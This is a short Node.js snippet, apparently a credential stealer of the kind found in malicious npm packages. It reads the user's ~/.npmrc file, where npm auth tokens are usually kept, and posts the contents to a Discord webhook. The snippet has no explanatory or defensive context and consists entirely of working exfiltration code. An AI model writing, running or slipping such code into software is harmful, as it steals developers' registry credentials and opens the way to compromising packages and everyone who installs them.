const fs = require('fs'), os = require('os');
const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
fetch('https://discord.com/api/webhooks/000000/XXXX', { method: 'POST', body: JSON.stringify({ content: npmrc }) });
